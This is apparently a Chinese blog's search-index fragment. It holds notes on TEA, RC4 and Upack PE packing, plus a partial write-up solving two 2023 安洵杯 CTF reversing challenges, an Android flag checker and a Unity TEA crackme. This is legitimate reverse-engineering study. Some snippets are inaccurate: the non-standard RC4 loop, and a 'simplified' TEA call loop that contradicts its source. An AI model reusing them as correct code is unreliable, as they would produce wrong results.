std::hex &lt;&lt; std::uppercase &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="破解方法">破解方法</h2><h3 id="缺陷">缺陷</h3><p>似乎网上很多blog都提到了密钥表攻击TEA，但是我没找到</p><p>[等待施工][QAQ]</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 对称加密 </tag>
            
            <tag> 块加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密01:RC4</title>
      <link href="/posts/ed8aa7e2.html"/>
      <url>/posts/ed8aa7e2.html</url>
      
        <content type="html"><![CDATA[<h1>Rivest Cipher 4</h1><h2 id="性质">性质</h2><p>串流加密，密钥长度可变，对称加密，加密解密使用同一套算法</p><ul><li>串流加密：即密钥是通过一个随机种子通过算法得到的伪随机密钥流，用这一串密钥加密或解密。使加密过程有完善保密性（密钥长度不短于明文长度）</li><li>对称加密：加密解密双方使用同一个密钥加密解密或双方使用的是两个可以简单地相互推算的密钥</li><li>加密解密使用同一套算法：RC4一般使用异或加密，由于异或的对合性（$f(f(x))=x$,对任意x均成立），可以使用相同算法加密</li></ul><hr><h2 id="过程">过程</h2><h3 id="初始化（KSA）">初始化（KSA）</h3><ol><li><p>初始化S盒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S.append(i)</span><br></pre></td></tr></table></figure></li><li><p>打乱S盒(这个算法可以保证每一项都被换过)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key = ...</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br></pre></td></tr></table></figure></li></ol><h3 id="伪随机子密码生成（PRGA）">伪随机子密码生成（PRGA）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i,j = (i+<span class="number">1</span>)%<span class="number">256</span>,(j+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br><span class="line">    c = m[i] ^ S[(S[i] + S[j]) % <span class="number">256</span>]</span><br></pre></td></tr></table></figure><p>注：最后的算法不一定是标准的，但是只要是原文和一个在过程中产生的值异或，就可以算作RC4。</p><hr><h2 id="破解方法">破解方法</h2><h3 id="缺陷">缺陷</h3><p>[等待施工][QAQ]</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> 加密方法 </tag>
            
            <tag> 对称加密 </tag>
            
            <tag> 流加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》05-Upack和PE结构</title>
      <link href="/posts/65cde422.html"/>
      <url>/posts/65cde422.html</url>
      
        <content type="html"><![CDATA[<p>upack是一个压缩器，用于压缩PE文件,跟随逆核一起深入学习PE文件结构</p><h1>特征</h1><p>PE文件经过upack之后有以下特点：</p><h2 id="重叠文件头">重叠文件头</h2><ul><li><p>把MZ文件头(dos头)和PE头重合在一起</p></li><li><p>原理是dos头中的e_lfanew指向NT头但是并没有说NT头不能和DOS头重合,一般情况下:</p></li><li><pre><code>e_fanew = MZ文件大小(40h)+DOS存根=E0<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 但是Upack后e_fanew值是<span class="number">10</span><span class="built_in">h</span>,所以hex方式打开后,第一排是<span class="number">4</span>D5A下一排就是<span class="number">5045</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 在可选头中插入解码代码</span></span><br><span class="line"></span><br><span class="line">- 修改SizeOfOpionalHeader的值增加至<span class="number">148</span><span class="built_in">h</span>，这样在节区头和可选头中间就可以插入解码代码，此时节区头的起始偏移是</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  <span class="number">170</span><span class="built_in">h</span>=<span class="number">28</span><span class="built_in">h</span>(可选头起始偏移)+<span class="number">148</span><span class="built_in">h</span></span><br></pre></td></tr></table></figure></code></pre></li><li><p>(SizeOfOpionalHeader的作用是想要根据PE文件形态更换和插入其它可选头形态的结构体)</p></li></ul><h2 id="在文件头插入解码代码">在文件头插入解码代码</h2><ul><li>可选头中的NumberOfRvaAndSizes由10h变为Ah,使得DataDirectory只有前10个元素,并把后面6个元素的位置改为自己的解码代码</li></ul><h2 id="在节区头中记录自身数据和重叠节区">在节区头中记录自身数据和重叠节区</h2><ul><li>节区头中类似重定位节区是不需要的,所以这种节区可以用于记录自身数据</li><li>整个PE文件分为4个部分:PE头,第一节区,第二节区,第三节区.有以下几个特性:</li><li>内存中,PE头,第一节区,第三节区均由同一区域映射而来,即SizeOfRawData和RawOffset相同,但是VirtulSize不同<ul><li>源文件压缩于第二节区</li><li>第一节区的SizeOfImage与原PE文件相同,即原PE文件会解压到第一节区</li></ul></li></ul><hr><h2 id="RVA-to-RAW">RVA to RAW</h2><p>标准操作是:</p><p><code>RAW=RVA-VA+PointerToRawData</code></p><p>但是经过upack后,第一节区的PointerToRawData值为10,然而不为FileAlignment(200h)的倍数,因此PE装载器强制识别为其整倍数(确保指向一页),令其等于0</p><p>所以正确值是:</p><p><code>RAW=RVA-VA</code></p><h2 id="导入表">导入表</h2><ul><li>通过存在在节区的末尾,省略最后的null结构体,映射到内存时,后面自然有null填充,这样可以节约空间</li></ul><h2 id="导入地址表">导入地址表</h2><ul><li>在DOS存根中存放导入DLL的名称,查看FirstThunk可以找到对应加载的函数.</li></ul><hr><h1>调试过程</h1><ul><li>先是解码循环,再是设置IAT(和UPX差不多?),但是设置IAT的方法是用导入的函数LoadLibraryA和GetProcAddress一边循环一遍构建(先获取导入函数实际地址,再写入原函数)IAT</li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> PE </tag>
            
            <tag> 壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023安洵杯RE部分复现</title>
      <link href="/posts/a04e3508.html"/>
      <url>/posts/a04e3508.html</url>
      
        <content type="html"><![CDATA[<h1>安洵杯RE</h1><h2 id="mobilego">mobilego</h2><p>现在模拟器中尝试输入，返回nonono</p><p>jadx打开mainactivity</p><p>发现判断函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> m141lambda$onCreate$<span class="number">0</span>$comexamplemobilegoMainActivity(View v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Game.checkflag(<span class="built_in">this</span>.editText.getText().toString()).equals(getResources().getString(C0569R.string.cmp))) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;yes your flag is right&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;No No No&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在C0569R中有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">string</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">app_name</span> <span class="operator">=</span> <span class="number">2131689500</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> <span class="number">2131689512</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的cmp是它的id值而不是它的具体值</p><p>所以动态调试找到终值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">49021</span>&#125;<span class="number">5</span>f919038b440139g74b7Dc88330e5d&#123;<span class="number">6</span></span><br></pre></td></tr></table></figure><p>这里使用了Game.checkflag这个方法来加密</p><p>所以先看这个</p><p>根据game</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> game;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> p004go.Seq;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">checkflag</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Seq.touch();</span><br><span class="line">        _init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Game</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">touch</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>怀疑checkflag是通过lib加载的</p><p>打开ida，反汇编so文件</p><p>搜索checkflag</p><p>找到5个函数</p><p><img src="https://s2.loli.net/2023/12/28/Z4TbAVSxCklJaOB.png" alt="image-20231228150946781"></p><p>函数是这几个</p><p>好复杂，看不懂。。</p><p>最后看了看wp，发现一个一直没注意的东西，如果输入</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234567890</span>变为<span class="number">6143580927</span>，</span><br><span class="line">&#123;qwertyuiopasdfghjklzxcvbnm&#125;变为bhgsruc&#123;iojqkdpwnezyvxa&#125;lfmt</span><br></pre></td></tr></table></figure><p>说明这个加密只是字符交换，交换之后是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">49021</span>&#125;<span class="number">5</span>f919038b440139g74b7Dc88330e5d&#123;<span class="number">6</span></span><br></pre></td></tr></table></figure><p>一共38个字符</p><p>那么尝试输入一个不重复的值，这样就可以直接找到映射表：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t<span class="number">2</span>F<span class="number">7</span>GTglISYL<span class="symbol">nMzc6</span>CqhD<span class="symbol">N5</span>OdX<span class="number">8</span>wPjsKufVbE&#125;</span><br></pre></td></tr></table></figure><p>变为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NVLjz&#125;ShscYPndXT62qlDFO5I8tgEKw7ufbMGC</span><br></pre></td></tr></table></figure><p>根据这个对应关系，逆向解出原来的关系</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">d1 = <span class="string">&#x27;t2F7GTglISYLnMzc6CqhDN5OdX8wPjsKufVbE&#125;&#x27;</span></span><br><span class="line">d2 = <span class="string">&#x27;NVLjz&#125;ShscYPndXT62qlDFO5I8tgEKw7ufbMGC&#x27;</span></span><br><span class="line"></span><br><span class="line">f2 = <span class="string">&#x27;49021&#125;5f919038b440139g74b7Dc88330e5d&#123;6&#x27;</span></span><br><span class="line">f1 = [<span class="number">0</span>]*<span class="number">38</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">        <span class="keyword">if</span> (d2[j] == d1[i]):</span><br><span class="line">            f1[i] = f2[j]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(f1))</span><br><span class="line"><span class="comment">#D0g3&#123;4c3b5903d11461f94478b7302980e958&#125;</span></span><br></pre></td></tr></table></figure><p>总结：</p><p>猜测输入时尽量使用有规律的字符，更容易看清</p><p>如果不容易逆向可以尝试看或者猜</p><hr><h2 id="牢大想你了">牢大想你了</h2><p>用dnspy打开Assembly-CSharp.dll后，可以看到主内容中不同类（没学过csharp，猜的），是以下几个类：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB</span></span><br><span class="line"><span class="attribute">ABBBBABABBAABABBBBBABBBBABABBBAAAABBBAABBBAABBA</span></span><br><span class="line"><span class="attribute">BBBBAAABABABABAAABABBBBBAAABBBAAAAABBBBAABAAABB</span></span><br><span class="line"><span class="attribute">GameManager</span></span><br><span class="line"><span class="attribute">UIManager</span></span><br></pre></td></tr></table></figure><p>上面三个的变量名和类名都被混淆了，需要先根据字符串找到逻辑代码</p><p>在GameManager找到多个：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (<span class="name">array</span>.*SequenceEqual*(<span class="name">encryptedData</span>))</span><br><span class="line">if (<span class="name">array</span>.*SequenceEqual*(<span class="name">encryptedData</span>))</span><br><span class="line">if (<span class="name">array</span>.*SequenceEqual*(<span class="name">encryptedData</span>))</span><br><span class="line">if (<span class="name">array</span>.*SequenceEqual*(<span class="name">encryptedData</span>))</span><br></pre></td></tr></table></figure><p>同时在这个语句上面均有</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RuntimeHelpers.InitializeArray(array, fieldof(&lt;PrivateImplementationDetails&gt;.BC42CACDF93A0A1981A27121FBDC9584A9570918).FieldHandle);</span><br></pre></td></tr></table></figure><p>相当于先把array先初始化为BC42CACDF93A0A1981A27121FBDC9584A9570918的值，这个字符不是值而是类似于变量名的东西</p><p>所以打开看看</p><p>结果向下看发现直接就有array的值，这样末值就有了</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uint</span>[] array = <span class="keyword">new</span> <span class="built_in">uint</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">3363017039U</span>,</span><br><span class="line"><span class="number">1247970816U</span>,</span><br><span class="line"><span class="number">549943836U</span>,</span><br><span class="line"><span class="number">445086378U</span>,</span><br><span class="line"><span class="number">3606751618U</span>,</span><br><span class="line"><span class="number">1624361316U</span>,</span><br><span class="line"><span class="number">3112717362U</span>,</span><br><span class="line"><span class="number">705210466U</span>,</span><br><span class="line"><span class="number">3343515702U</span>,</span><br><span class="line"><span class="number">2402214294U</span>,</span><br><span class="line"><span class="number">4010321577U</span>,</span><br><span class="line"><span class="number">2743404694U</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">c</span><span class="number">873914</span>f<span class="punctuation">,</span></span><br><span class="line"><span class="number">4</span>a<span class="number">628600</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">20</span><span class="keyword">c</span><span class="number">77</span>a<span class="number">1</span><span class="keyword">c</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">1</span>a<span class="number">877</span>aaa<span class="punctuation">,</span></span><br><span class="line">d<span class="number">6</span>faa<span class="number">982</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">60</span>d<span class="number">1</span><span class="keyword">c</span><span class="number">964</span><span class="punctuation">,</span></span><br><span class="line">b<span class="number">9884</span><span class="keyword">c</span><span class="number">32</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">2</span>a<span class="number">08</span>a<span class="number">862</span><span class="punctuation">,</span></span><br><span class="line"><span class="keyword">c</span><span class="number">74</span>a<span class="number">0036</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">8</span>f<span class="number">2</span>ee<span class="number">196</span><span class="punctuation">,</span></span><br><span class="line">ef<span class="number">08</span>a<span class="number">6</span>a<span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">a<span class="number">3850896</span></span><br></pre></td></tr></table></figure><p>然后就是找加密函数即encryptedData的来源</p><p>在上面一行：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Buffer.BlockCopy(paddedArray, <span class="number">0</span>, uintArray, <span class="number">0</span>, paddedArray.Length);</span><br><span class="line"><span class="built_in">uint</span>[] encryptedData = <span class="keyword">new</span> <span class="built_in">uint</span>[<span class="number">0</span>];</span><br><span class="line">AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB str2 = <span class="keyword">new</span> AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB(str);</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; uintArray.Length; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">encryptedData = encryptedData.Concat(str2.BABBBBBBAAAAAABABBBAAAABBABBBAABABAAABABBAAABBA(uintArray[i], uintArray[i + <span class="number">1</span>])).ToArray&lt;<span class="built_in">uint</span>&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BABBBBBBAAAAAABABBBAAAABBABBBAABABAAABABBAAABBA是一个方法，那么化简一下方法名：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; uintArray.Length; i += <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">encryptedData = encryptedData.Concat(str2.tea(uintArray[i], uintArray[i + <span class="number">0</span>])).ToArray&lt;<span class="built_in">uint</span>&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>十分明显了，uintArray是输入，定义是</p><p>uint[] uintArray = new uint[paddedArray.Length / 0];</p><p>str2在前面是</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB str2 = <span class="keyword">new</span> AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB(str);</span><br></pre></td></tr></table></figure><p>一个抽象的定义，所以直接进tea看看</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">uint</span>[] <span class="title">tea</span>(<span class="params"><span class="built_in">uint</span> ABBAABAAAAAABAAAABBBBBBABAABAAAABBBABBBAABBABBA, <span class="built_in">uint</span> BAABBAAAAABABBAABBABBAABABABABABABAAABABBBABABA</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> v0 = ABBAABAAAAAABAAAABBBBBBABAABAAAABBBABBBAABBABBA;</span><br><span class="line"><span class="built_in">uint</span> v = BAABBAAAAABABBAABBABBAABABABABABABAAABABBBABABA;</span><br><span class="line"><span class="built_in">uint</span> sum = <span class="number">1U</span>;</span><br><span class="line"><span class="built_in">uint</span> delta = <span class="number">4294967252U</span>;</span><br><span class="line"><span class="built_in">uint</span>[] str2 = <span class="keyword">this</span>.BBABABBBABBABABAAABBBAABBAAAAAAABBBBBAABBAAAAAA;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt; <span class="number">-103</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += delta;</span><br><span class="line">v0 += ((v &lt;&lt; <span class="number">7</span>) + str2[<span class="number">1</span>] ^ v + sum ^ (v &gt;&gt; <span class="number">0</span>) + str2[<span class="number">1</span>]);</span><br><span class="line">v += ((v0 &lt;&lt; <span class="number">7</span>) + str2[<span class="number">5</span>] ^ v0 + sum ^ (v0 &gt;&gt; <span class="number">4</span>) + str2[<span class="number">8</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">uint</span>[] array = <span class="keyword">new</span> <span class="built_in">uint</span>[<span class="number">8</span>];</span><br><span class="line">array[<span class="number">0</span>] = v0;</span><br><span class="line">array[<span class="number">0</span>] = v;</span><br><span class="line"><span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这里还需要str2的值，在GameManager的上面部分写了</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint[] str = <span class="keyword">new</span> uint[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">286331153U,</span></span><br><span class="line"><span class="built_in">286331153U,</span></span><br><span class="line"><span class="built_in">286331153U,</span></span><br><span class="line"><span class="number">286331153</span>U</span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line">AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB str2 = <span class="keyword">new</span> AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB(str)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>可知，</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encryptedData = encryptedData.Concat(str2.BBBABAABAAABBAAABBBAABBAAAAAABABBBBBBABBABABAAB(<span class="built_in">uint</span>Array[i], <span class="built_in">uint</span>Array[i + <span class="number">0</span>])).ToArray&lt;<span class="built_in">uint</span>&gt;();</span><br></pre></td></tr></table></figure><p>这里的str2就是这四个值，key也就是这四个值</p><p>最后还要在加密的类里面看哪个是正确的加密函数（有一堆tea），检查i的值（不应该是无限循环）和key数组的个数（0到3）</p><p>最后只剩一个</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">uint</span>[] <span class="title">BABBBBBBAAAAAABABBBAAAABBABBBAABABAAABABBAAABBA</span>(<span class="params"><span class="built_in">uint</span> ABBAABAAAAAABAAAABBBBBBABAABAAAABBBABBBAABBABBA, <span class="built_in">uint</span> BAABBAAAAABABBAABBABBAABABABABABABAAABABBBABABA</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> v0 = ABBAABAAAAAABAAAABBBBBBABAABAAAABBBABBBAABBABBA;</span><br><span class="line"><span class="built_in">uint</span> v = BAABBAAAAABABBAABBABBAABABABABABABAAABABBBABABA;</span><br><span class="line"><span class="built_in">uint</span> sum = <span class="number">0U</span>;</span><br><span class="line"><span class="built_in">uint</span> delta = <span class="number">2654435769U</span>;</span><br><span class="line"><span class="built_in">uint</span>[] str2 = <span class="keyword">this</span>.BBABABBBABBABABAAABBBAABBAAAAAAABBBBBAABBAAAAAA;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += delta;</span><br><span class="line">v0 += ((v &lt;&lt; <span class="number">4</span>) + str2[<span class="number">0</span>] ^ v + sum ^ (v &gt;&gt; <span class="number">5</span>) + str2[<span class="number">1</span>]);</span><br><span class="line">v += ((v0 &lt;&lt; <span class="number">4</span>) + str2[<span class="number">2</span>] ^ v0 + sum ^ (v0 &gt;&gt; <span class="number">5</span>) + str2[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">uint</span>[]</span><br><span class="line">&#123;</span><br><span class="line">v0,</span><br><span class="line">v</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么写tea解密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 